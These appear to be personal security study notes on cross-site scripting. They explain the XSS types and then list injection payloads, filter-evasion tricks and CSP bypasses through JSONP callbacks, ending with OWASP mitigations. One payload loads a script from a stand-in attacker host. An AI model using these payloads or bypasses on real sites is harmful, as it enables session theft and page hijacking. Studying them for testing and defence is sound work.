---
tags:
  - NBBC
  - Vulns/Web
---
## Cross-Site Scripting 
Cross-Site Scripting (XSS) is a security vulnerability that allows attackers to inject client-side scripts into web pages viewed by other users. These injected scripts can be malicious and can be used to steal sensitive information, modify page content, or redirect users to malicious websites. XSS attacks often occur when a web application doesn't properly sanitize user input before displaying it on a web page.

- [https://owasp.org/www-community/attacks/xss/](https://owasp.org/www-community/attacks/xss/)
- [https://portswigger.net/web-security/cross-site-scripting](https://portswigger.net/web-security/cross-site-scripting)

## How XSS Works:
1.  Injection:
	An attacker injects malicious script code into a web application, typically through user input fields or as part of a URL. 
2. Inclusion:
	The web application, without proper sanitization, includes this malicious script code in the HTML response sent to the browser. 
3. Execution:
	When the victim's browser loads the page containing the malicious script, the script is executed in the context of the trusted website, allowing the attacker to potentially steal information or manipulate the page. 
Injecting scripts for **XSS (Cross-Site Scripting)** involves exploiting points where user input is improperly handled and rendered into HTML, JavaScript, or the DOM. Below are various **ways attackers inject scripts**, categorized by context.

## Types of XSS:
#### Reflected XSS
- Reflected XSS attacks (that is, non-persistent XSS attacks) occur when malicious code or scripts are injected by a vulnerable web application using any method that yields a response as part of a valid HTTP request. 
- An example of a reflected XSS attack is a user being persuaded to follow a malicious link to a vulnerable server that injects (reflects) the malicious code back to the user’s browser. This causes the browser to execute the code or script. In this case, the vulnerable server is usually a known or trusted site.
#### Stored (persistent) XSS
- Stored, or persistent, XSS attacks occur when malicious code or script is permanently stored on a vulnerable or malicious server, using a database. These attacks are typically carried out on websites hosting blog posts (comment forms), web forums, and other permanent storage methods.
- An example of a stored XSS attack is a user requesting the stored information from the vulnerable or malicious server, which causes the injection of the requested malicious script into the victim’s browser. In this type of attack, the vulnerable server is usually a known or trusted site.
#### DOM-based XSS:
- The vulnerability lies in the client-side code (Document Object Model), allowing the attacker to manipulate the page's content or functionality. 
- The Document Object Model (DOM) is a cross-platform and language-independent application programming interface that treats an HTML, XHTML, or XML document as a tree structure.
- In DOM-based XSS attacks, the payload is never sent to the server. Instead, the payload is only processed by the web client (browser).
- In a DOM-based XSS attack, the attacker sends a malicious URL to the victim, and after the victim clicks on the link, the attacker may load a malicious website or a site that has a vulnerable DOM route handler. After the vulnerable site is rendered by the browser, the payload executes the attack in the user’s context on that site.
#### Blind XSS 
The attacker's payload is stored on the server and executed when a different user visits the affected page. Unlike reflected or stored XSS, the attacker doesn't immediately see the result of their injected code. Instead, the malicious script lies dormant until triggered by a user accessing the compromised functionality. This often occurs in applications where user input is stored and later displayed to administrators or other users in a different part of the application.
- Use [XSS Hunter](https://github.com/trufflesecurity/xsshunter) - [https://xsshunter.trufflesecurity.com/app/#/ ](https://xsshunter.trufflesecurity.com/app/#/)
- Add payloads in http header using proxy tools. Admin tools may display header information which we can exploit this way.

## Script Injection Techniques

#### 1. Basic Script Tag (HTML Context)
```html
<script>alert('XSS')</script>
<script SRC=http://hacker.org/xss.js></script>
```
- Works when input is directly placed inside the HTML body without escaping.
- **Context:** HTML
    ```html
    <div>Hello, USER_INPUT</div>  
    <!-- Payload -->  
    <script>alert(1)</script>
    ```
- **Broken HTML Technique:**
    - Injecting unclosed or malformed tags to break HTML structure:
        ```html
        "><script>alert(1)</script>
        ```
#### 2. Event Handlers (Attribute Context)
- Injected via HTML tag attributes using event handlers like `onerror`, `onclick`, `onmouseover`.
```html
<img src="x" onerror="alert('XSS')">
<a href="#" onclick="alert('XSS')">Click me</a>
<div onmouseover="alert('XSS')">Hover me</div>
<input value="X" onfocus="alert(1)">
```
- **Context:** Attribute
    ```html
    <img src="USER_INPUT">  
    <!-- Payload -->  
    " onerror="alert(1)
    x" onmouseover=alert(1);// 
    ```
    - The `//` comments out the rest of the attribute to prevent syntax errors.
- **No `<script>` Required** (Inline Event Examples):
```html
<details open ontoggle=alert(1)>
<marquee onstart=alert(1)>
```
#### 3. JavaScript URI Injection (URL Context)
Used when input is reflected in `href`, `src`, or similar attributes.
```html
<a href="javascript:alert('XSS')">Click</a>
<iframe src="javascript:alert('XSS')"></iframe>
<img src="javascript:alert('xss');">
```
- **Object or Script Tag Payloads:**
```html
<object data="data:text/html,<script>alert(1)</script>"></object>
<script src="data:text/javascript,alert(1)"></script>
```
- **Context:** URL
    ```html
    <a href="USER_INPUT">Click</a>
    <!-- Payload -->  
    javascript:alert(1)
    ```
#### 4. DOM-Based XSS (DOM Context)
Occurs on the client side when input is processed via JavaScript without sanitization.
```js
document.body.innerHTML = location.hash;
```
- **Injection Example (via URL):**
    ```
    https://example.com/#<script>alert(1)</script>
    ```
#### 5. **Malicious CSS (CSS Context)**
Rare and mostly works in older browsers (like legacy IE).
```html
<div style="background-image: url(javascript:alert(1))">
```
- **Context:** CSS
    ```html
    <style>body { background: USER_INPUT; }</style>
    <!-- Payload -->  
    url("javascript:alert(1)")
    ```
#### 6. **Base64 / Obfuscated Payloads (Data URI Context)**
Used to bypass filters or input sanitizers.
```html
<iframe src="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=="></iframe>
```
- **Also in:**
    ```html
    <object data="data:text/html,<script>alert(1)</script>"></object>
    ```
#### 7. **SVG / MathML / Other Scripting Tags**
Certain tags support inline scripts or JS events.
```html
<svg onload="alert(1)"></svg>
<math href="javascript:alert(1)"></math>
```
Using the HTML **embed** tags to embed a Scalable Vector Graphics (SVG) file:
```
<EMBED
SRC=”data:image/svg+xml;base64,PHN2ZyB4bWxuczpzdmc9Imh0dHA6Ly93d3cudzMub3JnLzIwMDAvc3ZnIiB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHhtbG5zOnhsaW5rPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5L3hsaW5rIiB2ZXJzaW9uPSIxLjAiIHg9IjAiIHk9IjAiIHdpZHRoPSIxOTQiIGhlaWdodD0iMjAwIiBpZD0ieHNzIj48c2NyaXB0IHR5cGU9InRleHQvZWNtYXNjcmlwdCI+YWxlcnQoIlhTUyIpOzwvc2NyaXB0Pjwvc3ZnPg==" type="image/svg+xml" 
AllowScriptAccess="always"></EMBED>
```
#### 8. **JavaScript Injection (Script Context)**
When input is inserted into a `<script>` block.
```html
<script>var name = "USER_INPUT";</script>  
<!-- Payload -->  
"; alert(1); var x = "
```
- Exploitable when inputs are not escaped within JS strings or logic.
#### 9. **Template Engine Injection (Template Context)**
Occurs when using template engines like EJS, Handlebars, etc., that fail to escape user input.
```html
{{userInput}}  
<!-- Payload -->  
<script>alert(1)</script>
```
### Advanced Filter Bypass Techniques
| Technique           | Example                                 |
| ------------------- | --------------------------------------- |
| Unicode encoding    | `<scr\u0069pt>alert(1)</scr\u0069pt>`   |
| HTML Entities       | `&lt;script&gt;alert(1)&lt;/script&gt;` |
| JS Backticks / Eval | eval`alert(1)`                          |
| Nested Tags         | `<script><script>alert(1)</script>`     |
| Null Bytes          | `"><script>alert(1)</script>\0`         |
| US ASCII encoding   | `¼script¾alert(¢XSS¢)¼/script¾`         |
### Injection Entry Points
- Search boxes
- Profile bios/comments
- URL parameters (`?name=`)
- Form fields
- Cookies/localStorag
- AJAX/JSON data
- Hash/fragments in URLs
- File uploads (e.g., uploading HTML files)

### Markdown  
Varies on how markdown is parsed.
Commonly exploits hyperlinks by adding a js object as link:
```md
[[javascript:alert``|link]]
```
Sometimes the 'javascript' string will be filtered or removed. so we need to implement ways to evade it, by fuzzing or using images etc. 
```md
![["onerror="alert(1|image]])
``` 
- [https://github.com/JakobTheDev/information-security/Payloads/md/XSS.md](https://github.com/JakobTheDev/information-security/blob/master/Payloads/md/XSS.md)
- [https://github.com/cujanovic/Markdown-XSS-Payloads/](https://github.com/cujanovic/Markdown-XSS-Payloads/blob/master/Markdown-XSS-Payloads.txt)
### Filter Evasion
common filtering based on
- Script Tags case sensitivity 
- Script Tags second occurrence
- Script Tags : use other tags along with event handlers
- Tag On Attributes : use iframes/script/a tags
- All Tags : Try without closing the tags or trick the filtering like: `<scr<script>ipt>alert(1)</scr</script>ipt>`

## CSP Bypass
CSP eg:  
Header: `Content-Security-Policy: default-src 'self'; script-src 'self' ; img-src 'self' https://example.com;`
- [[CSP - Content Security Policy]]
- [Hacktricks CSP bypass](https://book.hacktricks.wiki/en/pentesting-web/content-security-policy-csp-bypass/index.html)

- `data:`
```html
content-security-policy: script-src 'self' https://app.hackinghub.io data:
Bypass: 
<script src=data:javascript,alert(1)></script>
```
- exploit [[JSONP]] with 3rd party domains 
	we can exploit callback functions that may be present in 3rd party urls. 
	- `https://www.youtube.com/oembed?url=&callback=alert(1)`
	- `https:accounts.google.com/o/oauth2/revoke?callback=alert(1)`
	- oauth implementations will usually have a callback function which we can exploit
```html
content-security-policy: script-src 'self' https://app.hackinghub.io https://www.google.com https://www.youtube.com

Bypass:
<script src=https://www.youtube.com/oembed?url=https://www.youtube.com/watch?v=TTw-EY7F1rM&callback=alert(1)></script>
```
- Find ways exploit upload file functionality to upload scripts and source them in script to bypass CSP. 

---
## Tips
- Use `alert(document.domain)` instead of `alert(1)`. source: [Google bug hunters](https://bughunters.google.com/learn/invalid-reports/web-platform/xss/5108550411747328/when-reporting-xss-don-t-use-alert-1)
- Assume that you will be inside a tag, so include closing tags when testing XSS(especially blind XSS).
- The [OWASP XSS Filter Evasion Cheat Sheet](https://www.owasp.org/index.php/XSS_Filter_Evasion_Cheat_Sheet) includes dozens of additional examples of evasion techniques.
- https://github.com/The-Art-of-Hacking/h4cker/blob/master/web_application_testing/xss_vectors.md

## XSS Mitigations
The following are general rules for preventing XSS attacks, according to OWASP:
- Use an auto-escaping template system.
- Never insert untrusted data except in allowed locations.
- Use HTML escape before inserting untrusted data into HTML element content.
- Use attribute escape before inserting untrusted data into HTML common attributes.
- Use JavaScript escape before inserting untrusted data into JavaScript data values.
- Use CSS escape and strictly validate before inserting untrusted data into HTML-style property values.
- Use URL escape before inserting untrusted data into HTML URL parameter values.
- Sanitize HTML markup with a library such as ESAPI to protect the underlying application.
- Prevent DOM-based XSS by following OWASP’s recommendations at [_https://cheatsheetseries.owasp.org/cheatsheets/DOM_based_XSS_Prevention_Cheat_Sheet.html_.](https://cheatsheetseries.owasp.org/cheatsheets/DOM_based_XSS_Prevention_Cheat_Sheet.html)
- Use the **HTTPOnly** cookie flag.
- Implement content security policy.
- Use the **X-XSS-Protection** response header.

You should also convert untrusted input into a safe form, where the input is displayed as data to the user. This prevents the input from executing as code in the browser. To do this, perform the following HTML entity encoding:
- Convert **_&_** to `&amp;`
- Convert **_<_** to `&lt;`
- Convert **_>_** to `&gt;`
- Convert **_“_** to `&quot;`
- Convert **_“_** to `&#x27;`
- Convert **_/_** to `&#x2F;`

The following are additional best practices for preventing XSS attacks:
- Escape all characters (including spaces but excluding alphanumeric characters) with the HTML entity **&#xHH;** format (where **HH** is a hex value).
- Use URL encoding only, not the entire URL or path fragments of a URL, to encode parameter values.
- Escape all characters (except for alphanumeric characters), with the **\uXXXX**
Unicode escaping format (where **X** is an integer).- CSS escaping supports **\XX** and **\XXXXXX**, so add a space after the CSS escape or use the full amount of CSS escaping possible by zero-padding the value.
- Educate users about safe browsing to reduce their risk of falling victim to XSS attacks.

XSS controls are now available in modern web browsers.

**NOTE** One of the best resources that lists several mitigations against XSS attacks and vulnerabilities is the OWASP Cross-Site Scripting Prevention Cheat Sheet, available at [_https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html_](https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html).